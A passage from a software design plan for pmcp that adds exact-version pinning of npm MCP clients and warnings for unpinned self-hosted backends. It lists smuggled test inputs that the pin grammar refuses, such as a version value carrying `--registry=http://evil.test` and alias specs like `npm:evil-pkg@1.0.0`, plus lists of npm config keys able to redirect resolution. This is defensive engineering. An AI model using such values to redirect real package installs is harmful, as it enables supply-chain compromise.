numbers below were re-measured on the revision-2 spike, which was then reverted.

| # | finding | resolution | evidence |
|---|---|---|---|
| codex P1 (blocking) + claude N1 | The materialiser rewrote an alias `myalias@npm:firecrawl-mcp@3.25.5` to `myalias@3.25.5`, which is a different registry package. | `_pin_npx_args` now pins only a **plain registry spec**, defined by grammar as an allowlist: `name`, or `name@<selector>` where the selector is one exact SemVer version (`is_valid_package_version`) or a dist-tag (`package_identity._DIST_TAG_RE`, a letter-led `[A-Za-z0-9._-]` word). Everything else npm accepts after `name@` is refused with a WARNING and the entry stays unpinned: aliases, URLs, git/`github:`, `file:`/tarball, and also ranges (a range selects a set). See D3 step 3. | Reproduced with the real npm resolver: `detect_package_type("npx", ["-y","myalias@npm:firecrawl-mcp@3.25.5"])` gives `('unknown', None)`, and `["-y","myalias@3.25.5"]` gives `('npm', 'myalias')`. Test `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec` covers 7 cases, all **7 red on rev 1** (`assert '3.25.5' is None`) and green on rev 2. `test_version_replaces_a_dist_tag_slot` is the positive control. Mutants M15 (7 red) and M16 (2 red). |
| codex P2 (blocking) + claude F1 | A range or dist-tag (`^3.25.5`, `~`, `next`) silenced the self-hosted warning, and `pmcp update` labelled a range `[PINNED] ... pinned at ^3.25.0`. | New `_is_exact_pin(package_type, pin)`: exact means `is_valid_package_version` in every ecosystem, plus a docker `sha256:` digest and a PEP 440 `==X` with no wildcard. The warning suppresses only on an **exact** pin, and names a non-exact one: `floats on '^3.25.5' (a range or tag, not one exact version)`. `update_server`'s refusal is **unchanged**: it still does not move what the operator chose. It now reports a non-exact selector as `floating_selector` (with `pinned_version=None`, `latest_comparison=None`) and a message that starts `'fc' is held at '^3.25.0'`. `pmcp update` prints **`[FLOATING] fc: held at ^3.25.0, a range or tag that re-resolves at every spawn (latest 3.26.0)`**. See D6 and D7. | `test_health_warns_on_a_range_or_dist_tag` (4 specs), `test_update_server_reports_a_range_as_floating_not_pinned` and `test_pmcp_update_renders_a_range_as_floating`: **6 red on rev 1** (`assert 0 == 1` ×4, `AttributeError: ... 'floating_selector'`, `['[FAILED] fc: long message']`), all green on rev 2. Mutants M17 (5 red), M18 (1) and M24 (1). |
| codex P3 (blocking) | One malformed entry aborted the whole manifest load: `args: ["-y", 123]` plus `version:` raised `AttributeError`. | Materialisation is contained **per entry** (`_materialize_version_pin_soft`). Any exception costs that entry its pin, with a WARNING, and everything else loads. | Reproduced with the same overlay (user `~/.pmcp/manifest.yaml`, entry `malformed`, `args: ["-y", 123]`, `version: "1.2.3"`): **main `9ca081e`: `entries: 108`**; **rev 1: `LOAD FAILED: AttributeError 'int' object has no attribute 'startswith'`**; **rev 2: `entries: 108 malformed.version: None`**. Test `test_a_pin_on_a_malformed_entry_costs_only_that_entry` covers int in args, int in an install argv, and int `command`, asserting `len(servers) == shipped + 1`: **3 red on rev 1** (`AttributeError` ×2, `TypeError`), green on rev 2. Mutant M19 (3 red). |
| claude F2 | A relaxer that the child inherits from the gateway's own environment never triggered the warning. | The **advisory** warning now judges the relaxer on `sanitized_subprocess_env(resolved.config.env, project_root)`, the exact environment `client/manager.py:2409` spawns with (the gateway's env minus managed secrets, plus the entry's env). The credential gate is **unchanged**: `credential_requirement`'s gate callers still pass `config.env`. For a gate, ignoring the ambient value is the safe direction (#124). For a warning, including it is. `tests/test_credential_predicate_guard.py` (no `os.environ` passed as `child_env`) stays green. | `test_health_warns_when_the_relaxer_comes_from_the_gateway_environment` (`monkeypatch.setenv("SELFHOST_API_URL", ...)`, empty `extra_env`) is **red on rev 1** (`assert 0 == 1`) and green on rev 2. In the same test, `credential_requirement(server).required is True` proves the gate did not move. Mutant M20 (1 red). |
| claude F3 | `gateway.health` loaded the manifest once or twice per call (~92 ms each), and logged a WARNING per load while an unapproved project overlay was present. | Health no longer reads config files at all. (1) The relaxer-declaring manifest entries are cached by `manifest_sources_fingerprint()`, a new `stat`-only key over the shipped manifest, the user overlay, the project overlay found by the cwd walk, the `$PMCP_MANIFEST_PATH` value and target, and the **trust store** (an approval changes what loads without touching the overlay). The manifest is re-loaded only when that key changes. (2) The config judged is the one the gateway actually **connected** with (`ClientManager.get_connected_configs()`, which already exists), so there is no `load_configs()`. A server that is not connected is not judged by health; `update_server` still warns for it. | Measured with 21 `health()` calls, firecrawl connected, a user `server_env` URL and an **unapproved project overlay** in the cwd. **main: 0.0 ms mean, 0 WARNING lines. rev 1: 223.6 ms mean (220.7 ms steady), 42 WARNING lines (2 per call). rev 2: 9.5 ms mean, first call 174.1 ms (one load plus resolver spawn), then 1.3 ms steady; 1 WARNING line in total.** Test `test_health_loads_the_manifest_once_until_a_source_changes` expects 3 calls to give 1 load, and a user-overlay write to give a 2nd load. It is **red on rev 1** (`assert 3 == 1`) and green on rev 2. Mutants M21 (no cache) and M22 (fingerprint misses the user overlay), 1 red each. |
| claude N2 | Build metadata was accepted (`3.25.5+evil`). | **Refused.** npm ignores build metadata when resolving, so the argv would run 3.25.5 while every report echoed a label that names nothing. The rule is `is_valid_package_version(raw) and "+" not in raw`, because SemVer's build segment is the `+...` suffix. | The parametrized refusal set gains `"3.25.5+evil"`: **red on rev 1** (`assert '3.25.5+evil' is None`), green on rev 2. Mutant M23 (1 red). |
| gemini note 1 | PyPI `pkg==1.2.3`: the pinned report's latest lookup uses the name `pkg==1.2.3` and so comes back unknown. | **Tabled, explicitly.** It is pre-existing: `detect_package_type` keeps `==X` in a uvx "name" on purpose, so the existing pinned-refusal fires. This plan only adds the report, which honestly says "latest version could not be determined". Fixing it means a PEP 440 lookup name for uvx pins, and it lands with any future uvx `version:` support (D5), not here. `_is_exact_pin` already treats `==1.2.3` as exact, so no false FLOATING and no false warning. | D5 (unchanged text), plus this row. |
| gemini note 2 | The descriptions cache labels a pinned server's tools with the registry's latest. | **Tabled, explicitly**, as Non-goal plus R2. It is pre-existing for `.mcp.json` pins, causes regeneration churn only, and nothing reads the label as the running version since #150. | Non-goals and R2 (unchanged). |

**Other notes from the claude seat.** (a) A lazily registered server that has never
connected is not judged by health. That is now explicit, and `update_server` still warns
for it. (b) After adding a pin, run `gateway.refresh`, because a child spawned before the
pin keeps its version until it is respawned. The README subsection states this (see
Documentation impact).

**Scope growth.** Still within threshold. There is no new source file: `handlers.py`
gains `_is_exact_pin`, `_relaxable_manifest_servers` and the cache attribute; `loader.py`
gains `_materialize_version_pin_soft` and `manifest_sources_fingerprint`; `types.py`
gains `floating_selector`; `cli.py` gains the `[FLOATING]` branch.

## Task

Consiliency/pmcp#294. Built-in manifest entries launch npm MCP clients unversioned
(`firecrawl`: `npx -y firecrawl-mcp`), and `pmcp update` moves them to the latest
release. That is fine for a vendor-hosted backend. With a **self-hosted** backend
(`api_key_optional_when: ["FIRECRAWL_API_URL"]`, Consiliency/pmcp#114), the client can
move ahead of the server without anyone noticing. On 2026-09-25, `firecrawl-mcp` 3.25.5
started sending fields that the self-hosted API rejected with a 400.

The maintainer's 2026-09-26 measurements (issue comment) found two things:

- The 400 **no longer reproduces**: the server was fixed in Consiliency/firecrawl#9. The
  unpinned-client hazard is still real (`~/.pmcp.json` still says
  `firecrawl-mcp@latest`, and ViperJuice/dotfiles#325 is still open).
- The self-hosted search returns an empty `success:true` in **1 of 6** identical
  requests. That is a server-side problem, and it constrains follow-up slice 3 (below).

Scope of this plan:

- **Proposal 1.** A `version:` field on a manifest entry, which a user overlay can set on
  a built-in entry without restating its install matrix. `pmcp update` then reports
  "pinned at X, newer available: Y".
- **Proposal 2.** A warning in `pmcp update` and `gateway.health` when an entry's
  `api_key_optional_when` relaxer is active and its client is unpinned.

## Research summary (current tree, `9ca081e`)

**How an npm spec reaches the spawned command.** A manifest `ServerConfig`
(`src/pmcp/manifest/loader.py:43-90`) carries `command`, `args` and a per-platform
`install` argv. Two paths spawn from it:

- `config/loader.py` `_manifest_server_to_config` (`:1364`) builds a `LocalMcpServerConfig`
  from `server.command` + `server.args`, and `client/manager.py` spawns that on every
  connect, restart and lazy reconnect.
- `manifest/installer.py` (`:182`, `:686`) runs `server_config.install[platform]` for
  provisioning.

`provision_gate._config_runs_exactly` (`provision_gate.py:166-184`) already codifies
"both spawn": an argv pin counts only if `args` AND every `install` argv run exactly
`name@version` under npx. `_package_slot` (`:136`) defines the slot: the first argument
that is not in `_NPX_LEADING_FLAGS = {-y, --yes, -q, --quiet}`.

**How `.pmcp.json`/`.mcp.json` interacts.** `_merge_manifest_defaults`
(`config/loader.py:1022`) copies the manifest's `command` and prepends its `args`
**only when the configured entry has no `command`**. An entry with explicit
`command`/`args` (the ViperJuice/dotfiles#325 shape,
`"args": ["-y", "firecrawl-mcp@3.25.5"]`) is taken verbatim. Only the manifest's
`extra_env` is merged in, for keys the entry does not set.

**How update resolution reads a pin.** `gateway.update_server`
(`tools/handlers.py:5292`) resolves the *effective* config through
`_resolve_lifecycle_target`, where configured wins over manifest. It classifies the
config with `detect_package_type` and then calls `_detect_effective_version_pin`
(`handlers.py:347-450`). When that returns a pin, the tool **already refuses**, with
`"'X' is pinned to 'V' in <source> (...). gateway.update_server will not move a pinned
server..."`. `tests/test_pkgid_panel_fixes.py:900` asserts that substring. The npm branch
of the pin check reads the package token through `_npm_package_arg`, npm's own parser
(#195), and treats `@latest` as unpinned. uvx `==`, cargo `--version` and docker
`:tag`/`@sha256:` are detected too. What is missing is *what is available*:
`get_package_version` (`version_checker.py:1736`) strips the tag in
`detect_package_type`, so for a pinned argv it returns the registry's `dist-tags.latest`.
`compare_versions` (`:1906`) is the three-way classifier (#164). So the report needs no
new resolution code.

**`pmcp update` is a thin client.** `cli.py:943 run_update` calls `gateway.update_server`
per target and prints `[OK]`/`[FAILED] server: message` (`:1005-1010`). `--json` dumps the
results. It **never exits nonzero** on a per-server failure. A pinned server therefore
prints today as `[FAILED]` with a long refusal message.

**Relaxer judgement.** `credential_requirement(server, child_env=...)`
(`loader.py:164-231`) returns `relaxed_by`, the relaxer variable name, when the entry
declares `api_key_optional_when` and the *child's* environment carries a usable value for
it. It never reads `os.environ` (#124). `config/loader.py:1437 _local_env` and `:1453
_eager_requires_credential` show the required call shape: the resolved config's `env` is
passed as `child_env`.

**npm resolver cost.** `NpmResolver` (`npm_resolver.py:234`) is a persistent node child:
43 ms to start, then ~0.5 ms per query, with deliberately no memoisation (`:449-462`).
Measured this session: with the three `npm_config_*` variables unset, the real resolver
(`active (npm 11.19.0)`) resolves `firecrawl-mcp@3.25.5` to the token
`firecrawl-mcp@3.25.5` → `npm`/`firecrawl-mcp`, pin `3.25.5`, and `@playwright/mcp@1.2.3`
→ pin `1.2.3`. `firecrawl-mcp@latest` → pin `None`. A version-qualified spec is ordinary
IDENTITY input and weakens nothing. With `npm_config_cache` set, the resolver is DISABLED
and every npm server reads as `unknown`. That is by design, and it is why every test
command below unsets those variables.

**Live registry check (read only).** `get_package_version("npx", ["-y",
"firecrawl-mcp@3.25.4"], None, None)` → `3.25.5`, and `compare_versions("3.25.4",
"3.25.5", "npm")` → `newer`. That is the exact report proposal 1 asks for.

**Overlay precedent.** `server_env:` (Consiliency/pmcp#108/#109) is a top-level overlay
map that patches `extra_env` on an **existing** server, so an operator does not have to
restate its command, args or install block. It cannot create a server (unknown name →
warning, skipped). It is applied per source after that source's whole-entry replaces
(`loader.py:894-907`). A project overlay reaches the parser only through
`read_and_gate(..., "project_manifest")` (`:862`), so an unapproved project file
contributes nothing at all (tests in `tests/test_project_source_consent_manifest.py:125`).

**Which shipped entries a pin can apply to (measured).** The spike's materialiser was run
over all 107 shipped entries with `version="1.0.0"`. **77 pinnable, 30 refused**: 19 uvx,
9 remote with an empty command, `cloudflare` (npx argv but a `url`, so remote), and
`context7`. The `context7` refusal is correct: its windows install is
`["cmd", "/c", "npx", ...]`, which `_config_runs_exactly` would not accept as pinned
either. `firecrawl` and every other `api_key_optional_when` user are pinnable.

**No output-schema snapshots.** Nothing under `tests/` compares a `gateway.health` or
`update_server` payload by dict equality (`grep -rln "ServerHealthInfo\|UpdateServerOutput"
tests/` → only `tests/test_auth.py`, field reads). New optional output fields break no
existing test. The full-suite run below confirms it.

**What can change what a registry spec runs (revision 6, C1; revision 7 keeps this as the map of what is OUT of scope).** Revision 7 judges only the rows an entry controls: the argv and the entry's env block. The npmrc, local-prefix and host-environment rows are the host's, and are trusted (Non-goals). Derived from the npm
sources installed on this host: npm **10.9.9** (node 22.23.3,
`/opt/consiliency/tooling/releases/2026.09.04.1-22960aab68a0/.../lib/node_modules/npm`) and
npm **11.19.0** (node 24.20.0,
`/mnt/workspace/consiliency-tooling-archive/2026.09.04.1-5cff52125d24/.../lib/node_modules/npm`).
Both read configuration through `@npmcli/config`, in the same order and with the same rules:

| source | how npm reads it (`@npmcli/config/lib/index.js`, both releases) | how the rev-6 warning treats it |
|---|---|---|
| argv flags | `nopt` over the `npx-cli.js` pre-scan; the first positional gets a `--` inserted before it | Structural read: `_package_slot` takes the first token that is not `-y`/`--yes`/`-q`/`--quiet`, so any other flag before the package becomes the "slot", which `split_plain_registry_spec` refuses → cannot verify. Tokens after the slot are the bin's arguments. In identity mode the resolver's own allowlist (`yes`, `package`) refuses any other flag. |
| `npm_config_*` environment variables | `loadEnv`: prefix matched **case-insensitively**, an **empty value skipped**, then (unless the rest starts with `//`) every `_` except a leading one becomes `-` and the key is lowercased | Every non-empty one in the **child's** environment (`sanitized_subprocess_env`: the gateway's env plus the server's) is normalised by that rule and judged by the allowlist below. |
| `NODE_OPTIONS` | node applies it before npm starts, so it can load code into npm | Loud when non-empty, in the child's environment. |
| server env overlay `PATH`, `HOME`, `NODE_PATH`, `NODE_OPTIONS`, `PREFIX`, `nvm_*` | relocate the npm that runs, or where its config lives | Loud. This is identity's own selection (`npm_resolver._gate_relevant_env`), reused. |
| inherited `HOME`, `PREFIX`, `DESTDIR`, `PATH` | `loadHome` (`env.HOME \|\| homedir()`), `loadGlobalPrefix` (`env.PREFIX`, else the node binary's grandparent on POSIX or its parent on Windows, with `DESTDIR` prepended on POSIX), and the `npm`/`npx` found on `PATH` | Used to **locate** the files below, as npm does; the files themselves are then read. |
| project config `<localPrefix>/.npmrc` | `loadLocalPrefix` walks up from the cwd for `package.json` or `node_modules`; **if none is found, the local prefix is the cwd**, and `<cwd>/.npmrc` is loaded (unless it is the user file) | A local prefix found above the cwd → loud (identity's `_has_local_prefix`, reused: a project `.npmrc` or a local bin). Otherwise `<cwd>/.npmrc` is read. |
| user config `$HOME/.npmrc` (`userconfig`) | `loadUserConfig` | Read. (`userconfig` itself is a loud key.) |
| global config `<global prefix>/etc/npmrc` (`globalconfig`) | `loadGlobalConfig` | Read, at the location computed as npm does. (`globalconfig` and `prefix` are loud keys.) |
| builtin config `<npm root>/npmrc` | `loadBuiltinConfig` | Read. The npm root is found from the launcher on the child's `PATH` (`<root>/bin/npx-cli.js`, or `<prefix>/lib/node_modules/npm`), the two layouts `_npm_resolve.js` handles. |

Every npmrc line is parsed as `ini` does (`;`/`#` comments, `key = value`, `key[]`), and
its key is judged by the same allowlist. A `[section]`, a quoted key or a `${VAR}` key is
not on it, so it is loud. An existing but unreadable file is loud.

**Which keys are harmless.** A key is harmless only if it cannot change which package,
which version, or which bytes `npx -y <name>@<exact>` runs. The union of the two releases'
definitions has **181 keys** (npm 10.9.9 defines 155; npm 11.19.0 defines 181, a superset:
it adds `allow-*`, `min-release-age*`, token/org keys and a few others). Measured with a
script that loads `@npmcli/config/lib/definitions` from each install:

- **Allowlisted, 90 defined keys**, in five groups:
  - the cache's location, `cache`: the same content-addressed store and `_npx/<hash>`
    lookup as the default location, only elsewhere;
  - output and UI (`color`, `loglevel`, `progress`, `fund`, `audit`, ...);
  - network timing (`fetch-*`, `maxsockets`);
  - credentials that never pick a registry (`_auth`, `otp`, `auth-type`);
  - `yes`, and keys read only by commands other than exec: `init*`, `save*`,
    publish/version/search/diff/token/org/sbom keys.

  The code lists them in `_NPM_KEYS_THAT_CANNOT_REDIRECT`, each group commented.
- **Allowlisted, 3 undefined keys**, named: pnpm's `store-dir` (dev0 exports
  `npm_config_store_dir`), and `email`/`always-auth` (removed in npm 9, still common in
  old `~/.npmrc` files). Neither release passes an undefined key to the code that fetches,
  installs or runs a package. Both flatten config through `definitions/index.js`
  `flatten`, which copies an undefined key only if it matches `/@.*:registry$/i` or
  `^//`. `npm exec` itself reads only `call`, `script-shell`, `package` and `yes` by name
  (`lib/commands/exec.js`).
- **Credential keys `//host/:...`**: harmless. They say how to authenticate to one
  registry, never which registry to use.
- **`@scope:registry`**: loud only when the package is in that scope.
- **Loud, 91 defined keys**, including every key that changes resolution or execution:
  `package`, `call`, `registry`, `replace-registry-host`, `tag`, `before`,
  `min-release-age`, `offline`, `prefer-offline`, `prefer-online`, `cache-min`,
  `cache-max`, `userconfig`, `globalconfig`, `prefix`, `global`, `location`,
  `workspace(s)`, `include-workspace-root`, `proxy`, `https-proxy`, `noproxy`,
  `strict-ssl`, `ca`, `cafile`, `cert`, `key`, `local-address`, `node-options`,
  `script-shell`, `shell`, `node-gyp`, `ignore-scripts`, `foreground-scripts`, `omit`,
  `include`, `os`, `cpu`, `libc`, `install-*`, `legacy-peer-deps`, `package-lock`,
  `shrinkwrap`, `git`, and `allow-*`. The rest (`all`, `if-present`, `usage`, `version`,
  `versions`, `name`, `password`, `which`, `umask`, `user-agent`, ...) are loud
  **conservatively**: they are not proved harmless for `npm exec`, or they make npm run
  nothing at all. Any key a later npm defines is loud too, because the list is an
  allowlist.

**How the resolver's refusal reasons map onto this.** The warning never classifies a
refusal by its text. Every reason `npm_resolver.py` and `_npm_resolve.js` can return falls
into one of four classes, and each class is re-derived independently:

| class | reasons | re-derived by |
|---|---|---|
| launcher | `command is not a bare npx/npm` | `_npm_identity_refusal_cause` names the launcher (NB-1). The resolver never ran, so the argv and context checks below decide. |
| context | `server env sets [...]`, `npm would set a local prefix at ...`, `gateway environment sets '...'` (sticky, and naming only the **first** key it saw) | `_npm_redirecting_context`, over **every** key and file: harmless keys (dev0's `npm_config_cache`) keep a structurally exact pin silent, and anything else is loud. |
| argv | `config key outside the allowlist`, `--package must name exactly one distinct package`, `no package operand`, `empty package spec`, `package operand starts with "-"`, `npa rejected the spec`, `npa type is not a registry spec`, `npa produced no package name`, `parser threw`, `args is not a list of strings`, the npm-subcommand reasons | The structural read: only `[-y\|--yes\|-q\|--quiet]* <plain registry spec>` is read, which is narrower than every npx pre-scan. Anything else is "cannot verify". |
| infrastructure | missing helper, node not spawnable, cooling down, no/bad handshake, two npm roots, npm root not located, `npx-cli.js` unreadable or hash not recognised, parser not loadable, self-test failed, child died/timed out/malformed/mismatched/unknown status/unusable spec, npm changed under the resolver | These say nothing about what this argv means. The argv and context checks decide. |

The node-less `UNAVAILABLE` state falls back to the flag tables. It yields an identity, so
it takes the identity-mode path, and the context check runs there too.

## Design decisions

### D1. Version grammar: one exact SemVer version, nothing else

A pin is accepted only if `pmcp.validation.is_valid_package_version(raw)` accepts it. That
is SemVer 2.0.0 with ASCII classes and no leading zeros, prerelease and build allowed,
≤256 characters, and the same predicate the provision gate already requires of an argv
pin. The following are refused, fail-soft with a WARNING, and the entry stays unpinned:

| refused | why |
|---|---|
| ranges: `^3.25.5`, `~3.25.5`, `3.x`, `*`, `>=3.25.0` | `npx -y pkg@^3` re-resolves the newest match at every spawn, which is the drift this issue is about. A range "pin" is a pin in name only, and `package_identity._resolve_version` refuses ranges for the same reason. |
| dist-tags: `latest`, `next` | The registry moves them. `@latest` is exactly today's unpinned behaviour, and `_detect_effective_version_pin` already reads it as unpinned. |
| `v3.25.5`, `3.25`, YAML float `3.25`, `true`, `""` | Not one exact SemVer. |
| build metadata: `3.25.5+evil` (rev 2, board N2) | npm ignores `+...` when resolving, so the argv would run `3.25.5` while every report echoed a label that names nothing. |
| a SemVer-shaped tarball: `3.25.5-evil.tgz`, `1.0.0-x.TAR`, `1.0.0-a.tar.gz`, `1.0.0-x.tar-gz` (rev 4, board round 3 B1'; rev 5) | npa checks `isFileType` before it reads a version, so `pkg@3.25.5-evil.tgz` is a **local file**, not a registry version. Refused because `is_valid_package_version`'s exact-version check follows npm's classification (main, #299), so `_is_exact_pin` refuses it too. |
| a core part above 2**53-1: `9007199254740992.0.0` (rev 5) | node-semver refuses it, and npa then reads the selector as a dist-tag. Refused by the same check. |
| anything with a name, space or flag: `evil-pkg@1.0.0`, `npm:evil-pkg@1.0.0`, `3.25.5 --registry=http://evil.test`, `../../tmp/x` | The value is a version and only a version. See D3. |

Validation is **syntactic and offline**. `load_manifest` never touches the network.
Whether `3.25.5` exists is proven later: by npx at spawn (a nonexistent version fails
the spawn loudly, which is the right failure), and by the registry read in
`update_server`.

### D2. Overlay semantics: `version:` on any entry, `server_version:` to patch one

- **`version:`** is an ordinary key on any `servers:` entry, whether shipped or a
  whole-entry overlay replace. It is parsed by `_parse_version_pin(name, raw, "version")`.
- **`server_version:`** is a new top-level overlay map, `{server-name: "X.Y.Z"}`. It is
  the version counterpart of `server_env:`, with the same rules:
  - It patches `version` on a server the manifest **already defines**. An unknown name
    gets a WARNING and is skipped, so the map can never create a server.
  - It is applied per source, **after** that source's whole-entry replaces, so a patch
    can refine an entry the same file just replaced.
  - Precedence is that of the sources: user < project < `$PMCP_MANIFEST_PATH`. A later
    source's whole-entry replace **drops** an earlier source's pin, because whole-entry
    replace means whole entry. This is the same as `server_env` today.
  - It travels in the project overlay's gated bytes. An **unapproved** project overlay's
    `server_version` contributes nothing (test
    `test_unapproved_project_server_version_contributes_nothing`, mutant M5), and an
    approved one applies (`test_approved_project_server_version_applies`).

  This is how an operator pins the built-in firecrawl:

  ```yaml
  # ~/.pmcp/manifest.yaml
  server_env:
    firecrawl:
      FIRECRAWL_API_URL: "http://ai:3002"
  server_version:
    firecrawl: "3.25.5"
  ```

- **Why a new map instead of a partial `servers: firecrawl: {version: ...}`.**
  `servers:` is whole-entry replace. README (`:1096-1099`) already warns that a partial
  `firecrawl:` entry erases the install block and resets `requires_api_key`. Making
  `servers:` merge would change what every existing overlay means. That is a separate,
  larger decision, and it is listed as an open question.

### D3. Materialisation: one post-overlay pass that rewrites the npx package slot everywhere it spawns

`load_manifest` ends with a single pass,
`servers = {name: _materialize_version_pin(entry) ...}`. It runs **after all overlays**
and also for an explicit `manifest_path`. For an entry with `version` set:

1. A remote entry (`url`) is refused, because there is no local client to pin.
2. The command must be npx under `provision_gate._is_npx`, the strict spelling set
   `npx`/`npx.cmd`/`npx.exe` that the pin check itself uses. Otherwise the pin is refused
   with a message that names the escape hatch (D5).
3. `_pin_npx_args(args, version)` finds the slot with the gate's rule (the first argument
   not in `_NPX_LEADING_FLAGS`) and parses it with `validation.parse_package_spec`. It
   keeps the **name** and replaces only the version suffix, so `firecrawl-mcp` becomes
   `firecrawl-mcp@3.25.5` and `@playwright/mcp@latest` becomes `@playwright/mcp@1.2.3`.
   If the slot is missing or not a package spec (`-p x`, `github:x/y`), the pin is
   refused. **Revision 2 (codex P1):** the slot must also be a **plain registry spec**,
   `name` or `name@<exact-version | dist-tag>`, decided by grammar
   (`is_valid_package_version` or `package_identity._DIST_TAG_RE`). An alias
   (`myalias@npm:other@1`), URL, git/`github:`, `file:`/tarball, or range selector is
   refused, because replacing it with `@<version>` would change **which** package runs.
   `myalias@npm:firecrawl-mcp@3.25.5` → `myalias@3.25.5` is the registry package
   `myalias` (measured with the real resolver).
4. The same rewrite is applied to **every** `install[platform]` argv. Each must be npx
   and must name the **same package** as `args`. Otherwise the whole pin is refused, all
   or nothing, because pinning `args` and not `install` "approves X and runs latest".
5. A refusal logs a WARNING, returns the entry unchanged with `version=None`, and so
   leaves the entry **honestly unpinned**. Proposal 2's warning then still fires for it.
   "`version` is set" always means "every spawning argv is pinned". The firecrawl test
   pins that invariant through the gate's own predicate:
   `_config_runs_exactly(pinned, "firecrawl-mcp@3.25.5")`.
   **Revision 3 (board round 2, B1/N4): the allowlist, derived class by class from
   npm-package-arg.** The source is npa as shipped with the host's npm
   (`node_modules/npm-package-arg/lib/npa.js`). npa classifies a spec in a fixed order,
   and only the last branch, `fromRegistry`, fetches `name` from the registry.
   `split_plain_registry_spec(arg)` accepts a slot only if it reaches that branch as a
   `version` or `tag` (or as a bare name, which npa types as the range `*`):

   | npa class (branch, in npa's order) | npa trigger | how `split_plain_registry_spec` treats it |
   |---|---|---|
   | url / git url (`isURL`, whole arg) | `^(?:git[+])?[a-z]+:` | refused: the name half contains `:`, so `parse_package_spec` rejects it |
   | git ssh (`isGit`, whole arg) | `^[^@]+@[^:.]+\.[^:]+:.+$` | refused: the selector contains `:` and is not a tag word |
   | file / directory, unscoped name part (whole arg) | name part has `/` **or `isFileType`** | refused: `/` fails `is_valid_package_name`; **`isFileType` on an unscoped name is refused explicitly (B1)**. A scoped name is exempt, as in npa. |
   | file (`isFileSpec`, selector) | `file:` prefix, or starts with `.`, `~/`, `/` or `X:` | refused: not a version and not a tag word (`:`, `/`, `.`-led, `~`) |
   | alias (`isAliasSpec`, selector) | `npm:` prefix | refused: `:` |
   | hosted git (`HostedGit.fromUrl`, selector) | `github:`, `gitlab:`, `user/repo`, ... | refused: `:` or `/` |
   | remote (`isURL`, selector) | `https:` and similar | refused: `:` |
   | file (`hasSlashes \|\| isFileType`, selector) | any `/`, **or `.tgz`/`.tar`/`.tar.gz`, any case**, including a strict SemVer ending that way (`3.25.5-corp.tgz`) | refused: `/` is not a tag-word char; **`isFileType` on the selector is checked FIRST, before the version branch, in npa's order (B1, then B1' in rev 4)**, and `is_valid_package_version` itself refuses a tarball-shaped version |
   | registry `version` (`semver.valid`, loose) | e.g. `3.25.5` | **accepted** when `is_valid_package_version` (strict SemVer, and never tarball-shaped since rev 4). Loose forms such as `v3.25.5`, `vv1.2.3` and `=3.25.5` are refused, which is conservative. |
   | registry `range` (`semver.validRange`, loose) | `^`, `~`, `>=`, `*`, `x`, `X`, `v1`, `1.x`, ... | **refused**. Symbol forms fail the tag word. **Letter-led forms (`x`, `X`, `v1.2.x`, and since rev 4 any run of `v`/`=`: `vv1`, `vvX`, `v1.X.xbeta`) are refused by the partial-version-word clause (N4, N-a).** A bare name (npa range `*`) is accepted: that is the entry running `name` at latest. |
   | registry `tag` (`encodeURIComponent(spec) === spec`) | anything URI-safe that is not a version or range | **accepted** when it fullmatches the letter-led `[A-Za-z][A-Za-z0-9._-]*` (a subset of npa's tags), and is neither a tarball name nor a partial-version word |
   | invalid (`EINVALIDTAGNAME` / `EINVALIDPACKAGENAME`) | e.g. `latest\n`, `tag!`, and the excluded names `node_modules`/`favicon.ico` in any case | refused: `fullmatch` (N4), `!` is outside the tag word, and the exclusion list is checked explicitly (rev 4, N-c) |

   **Measured against the real npa**, now with a **generated** corpus (rev 4,
   `corpus_conformance.py`, Verification step 10): **1,366,139 slots**, with 0 accepted
   slots that npa does not fetch as the same name from the registry as `version`/`tag`
   (or a bare name). There are also **35,028 pin values**, with 0 accepted that npa does
   not read as exactly that registry `version`. The rev-3 rule had 5,153 and 8 on the
   same corpus. The rev-3 hand-picked 461-slot list reported 0 and missed B1', which is
   why it was replaced. The tests use one case per class (`_NON_PLAIN_SLOTS`, 25 ids) plus 8
   accepted-class controls, because round 2 showed that example lists which only
   use `:`-prefixed forms can't see a letter-led class.
6. **Revision 2 (codex P3): per entry.** The pass calls `_materialize_version_pin_soft`,
   so an exception while reading one entry (a non-string argv element or `command`,
   which overlays can carry because only parsed fields are shape-checked) costs that
   entry its pin, with a WARNING. It never costs the manifest its other entries.

**Revision 4: "one exact version" means one exact *registry* version.** A strict SemVer string can still name a local file to npm (`1.0.0-x.tgz`). The pin grammar uses `is_valid_package_version`, whose check follows npm's classification, so no pin value or pinned argv can name a file.

**Why no redirect is possible.** The pin value passes D1's exact-version grammar (no `@`,
`/`, `:` or whitespace), and the package name always comes from the entry's own argv. A
`server_version` patch can therefore only pick a version of the package the entry
already runs. For honesty: a user-scope `servers:` **whole-entry replace** can still
point a built-in at any command. That is pre-existing, documented (README "Security"
note) and ungated by design, because it is the operator's own file. The invariant here is
about the version path, which adds no new redirect capability.

**Why rewriting argv beats a spawn-time override.** Every consumer already reads
`args`/`install`: `_manifest_server_to_config`, the installer,
`_detect_effective_version_pin`, `_config_runs_exactly`, `_manifest_package_names`
(policy denylist) and `_refresh_config_unchanged`. Rewriting once at load makes all of
them see the pinned spec with **zero** changes to spawn code. Two side effects are
desirable:

- A `.pmcp.json` entry with no `command` inherits the pinned args through
  `_merge_manifest_defaults` (test `test_a_config_entry_without_a_command_inherits_the_pin`).
- Changing a pin changes `args`, so `_refresh_config_unchanged` sees a new config and
  `gateway.refresh` respawns the server onto the new version.

### D4. Security invariants, checked one by one

- **#195 (npm identity refuses what it can't prove).** Nothing in the resolver changes.
  A pinned token is ordinary input to `_npm_package_arg`, measured to resolve IDENTITY
  (research). The materialiser's slot rule is the provision gate's, which is *stricter*
  than npm's parser (it rejects `-p`/`--package` before the slot), so a pin can only be
  applied where the gate would also call the argv pinned.
- **Overlay cannot redirect.** Covered in D3. Tests: the parametrized refusal cases
  `evil-pkg@1.0.0`, `npm:evil-pkg@1.0.0`, `3.25.5 --registry=...`, plus mutants M1 and M3.
- **Credential gates (#124).** Untouched. The warning *reads* `credential_requirement`
  with the resolved config's env as `child_env`, which is the same contract the seven
  gate consumers use (never `os.environ`). `extra_env`, `server_env` and the gates are
  not modified.
- **Project overlay approval.** `server_version` is parsed from the gated bytes only
  (`_parse_overlay_document(overlay_path, content)` after `read_and_gate`). There is no
  new file read. Test and mutant M5.
- **Provision gate.** A manifest entry is `manifest_backed` (rule 2) whether pinned or
  not. `_manifest_package_names` reads the same name from a pinned argv, so a
  `packages.denylist` still binds.

### D5. Non-npm installers: rejected with a clear error, and the existing escape hatch named

